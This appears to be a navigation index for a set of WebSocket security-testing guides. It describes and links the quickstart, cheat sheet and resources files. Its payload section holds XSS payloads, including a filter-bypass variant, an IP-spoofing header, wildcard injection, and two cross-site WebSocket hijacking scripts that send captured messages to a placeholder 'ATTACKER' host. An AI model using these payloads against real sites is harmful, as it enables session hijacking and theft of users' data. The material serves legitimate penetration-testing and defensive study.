# WebSockets Security - Quick Navigation Index

**Fast access to all WebSocket security resources**

---

## Core Documentation

### [websockets-quickstart.md](./websockets-quickstart.md)
**Rapid WebSocket security testing reference**

**What's Inside:**
- Prerequisites and setup
- Key payloads (XSS via message, handshake exploitation, CSWSH)
- Essential payloads cheat sheet
- Testing methodology checklist
- Common vulnerabilities checklist
- Quick command reference (wscat, Python, browser console)

**When to Use:**
- Need to complete testing quickly
- Want rapid exploitation techniques
- Active penetration test
- Troubleshooting common issues

**Key Sections:**
- Message Manipulation — XSS via WebSocket
- Handshake Exploitation — IP ban bypass + XSS filter bypass
- CSWSH Exploit Template
- Testing Methodology (recon, message manipulation, handshake, CSWSH)

---

### [websockets-cheat-sheet.md](./websockets-cheat-sheet.md)
**Quick reference for active penetration testing**

**What's Inside:**
- Basic concepts and protocol overview
- Handshake headers (client & server)
- Attack payloads (100+ payloads organized by type)
- Wildcard/parameter injection
- Burp Suite commands and shortcuts
- Tools & commands (wscat, websocat, Python)
- Exploitation scripts (ready to use)
- CSWSH exploit templates (POST and GET variants)
- Detection & identification techniques
- Common vulnerabilities checklist
- Defense checklist

**When to Use:**
- During active penetration testing
- Need quick payload reference
- Looking up tool commands
- Checking vulnerability indicators

**Key Sections:**
- Attack Payloads — XSS, SQLi, Command Injection, XXE
- Burp Suite Commands — All features explained
- Tools & Commands — wscat, websocat, Python
- Exploitation Scripts — Copy-paste automation
- Vulnerability Checklist — Quick assessment
- Defense Checklist — Secure implementation

---

### [websockets-resources.md](./websockets-resources.md)
**Comprehensive learning and reference materials**

**What's Inside:**
- Official standards (RFC 6455, W3C)
- OWASP resources (cheat sheets, testing guide)
- Industry standards (NIST, PCI DSS, ISO 27001)
- CVE database (real-world vulnerabilities)
- Tools & frameworks (complete list)
- Research papers (academic and industry)
- Training platforms (labs and courses)
- Bug bounty programs (WebSocket scope)
- Vulnerable applications (practice targets)
- Community & forums (where to get help)

**When to Use:**
- Deep dive into WebSocket security
- Finding training resources
- Looking for bug bounty opportunities
- Researching CVEs and exploits
- Setting up practice environment

**Key Sections:**
- Official Standards — RFC 6455, W3C specs
- OWASP Resources — Security guides
- CVE Database — Real vulnerabilities
- Tools & Frameworks — Complete toolset
- Training Platforms — Learn and practice
- Bug Bounty Programs — Get paid for findings

---

## Quick Access by Topic

### I want to...

#### Learn WebSocket Security Basics
1. Start: [websockets-quickstart.md - Prerequisites](./websockets-quickstart.md#prerequisites)
2. Study: [websockets-cheat-sheet.md - Basic Concepts](./websockets-cheat-sheet.md)
3. Reference: [websockets-resources.md - Official Standards](./websockets-resources.md)

#### Test WebSockets in Real Engagement
1. Identify: [websockets-cheat-sheet.md - Detection](./websockets-cheat-sheet.md#detection--identification)
2. Test: [websockets-cheat-sheet.md - Attack Payloads](./websockets-cheat-sheet.md#attack-payloads)
3. Quick ref: [websockets-quickstart.md - Essential Payloads](./websockets-quickstart.md#essential-payloads-cheat-sheet)

#### Exploit CSWSH Vulnerability
1. Quick: [websockets-quickstart.md - CSWSH Exploit Template](./websockets-quickstart.md#cswsh-exploit-template)
2. Payload: [websockets-cheat-sheet.md - CSWSH Template](./websockets-cheat-sheet.md#exploitation-scripts)
3. GET variant: [websockets-cheat-sheet.md - CSWSH GET-based](./websockets-cheat-sheet.md)

#### Use Burp Suite for WebSockets
1. Quick Ref: [websockets-quickstart.md - Burp Reference](./websockets-quickstart.md)
2. Commands: [websockets-cheat-sheet.md - Burp Commands](./websockets-cheat-sheet.md#burp-suite-commands)

#### Automate Testing with Scripts
1. Python: [websockets-cheat-sheet.md - Python Scripts](./websockets-cheat-sheet.md#python-websocket-testing)
2. Bash: [websockets-cheat-sheet.md - Bash Scripts](./websockets-cheat-sheet.md#bash-fuzzing-script)
3. Tools: [websockets-resources.md - Tools & Frameworks](./websockets-resources.md#tools--frameworks)

#### Implement Secure WebSockets
1. Checklist: [websockets-cheat-sheet.md - Defense Checklist](./websockets-cheat-sheet.md#defense-checklist)
2. Standards: [websockets-resources.md - OWASP](./websockets-resources.md#owasp-resources)

#### Research Real-World Exploits
1. CVEs: [websockets-resources.md - CVE Database](./websockets-resources.md#cve-database--advisories)
2. Case Studies: Gitpod CSWSH, CVE-2024-55591, CVE-2018-1270

#### Find Training Resources
1. Labs: [websockets-resources.md - Training Platforms](./websockets-resources.md#training-platforms)
2. Bug Bounty: [websockets-resources.md - Bug Bounty Programs](./websockets-resources.md#bug-bounty-programs)
3. Tools: [websockets-resources.md - Tools & Frameworks](./websockets-resources.md#tools--frameworks)

---

## Essential Payloads Quick Reference

```html
<!-- Basic XSS via WebSocket message -->
{"message":"<img src=1 onerror='alert(1)'>"}

<!-- Obfuscated XSS (filter bypass) -->
{"message":"<img src=1 oNeRrOr=alert`1`>"}

<!-- IP Spoofing Header (handshake) -->
X-Forwarded-For: 1.1.1.1

<!-- CSWSH Exploit (POST) -->
<script>
var ws = new WebSocket('wss://TARGET/chat');
ws.onopen = () => ws.send("READY");
ws.onmessage = (e) => fetch('https://ATTACKER', {method:'POST', body:e.data});
</script>

<!-- CSWSH Exploit (GET/log-based) -->
<script>
var ws = new WebSocket('wss://TARGET/chat');
ws.onopen = () => ws.send("READY");
ws.onmessage = (e) => fetch('https://ATTACKER/log?data=' + btoa(e.data), {method:'GET', mode:'no-cors'});
</script>

<!-- Wildcard injection -->
{"userId":"*","projectId":"*"}
```

### Burp Suite Quick Actions
| Action | Location | Shortcut |
|--------|----------|----------|
| WebSocket History | Proxy → WebSockets history | - |
| Send to Repeater | Right-click message | Ctrl+R |
| Edit Handshake | Repeater → Pencil icon | - |
| Burp Collaborator | Burp menu → Collaborator | - |
| Enable Interception | Proxy → Options → WebSocket Rules | - |

### Tool Commands
```bash
# wscat - Connect
wscat -c wss://target.com/chat

# wscat - With headers
wscat -c wss://target.com/chat -H "Cookie: session=abc"

# websocat - Advanced
websocat wss://target.com/chat --header="Cookie: session=abc"
```

---

## Version Information

- **Document Version:** 1.1
- **Last Updated:** January 2026
- **CVE Coverage:** 4 critical real-world vulnerabilities
- **Tools Covered:** 8+ security testing tools
- **Attack Techniques:** 7 major exploitation categories

---

## Support & Updates

**Stay Updated:**
- Monitor [Security Research Blog](https://portswigger.net/research) for new techniques
- Follow [CVE Database](./websockets-resources.md#cve-database--advisories) for new vulnerabilities
- Join [Security Communities](./websockets-resources.md#community--forums) for discussions

---

**Quick Start:** If you're new, start with [websockets-quickstart.md](./websockets-quickstart.md).

**Active Testing:** Keep [websockets-cheat-sheet.md](./websockets-cheat-sheet.md) open during penetration tests for quick payload reference.

**Continuous Learning:** Bookmark [websockets-resources.md](./websockets-resources.md) for ongoing skill development and research.
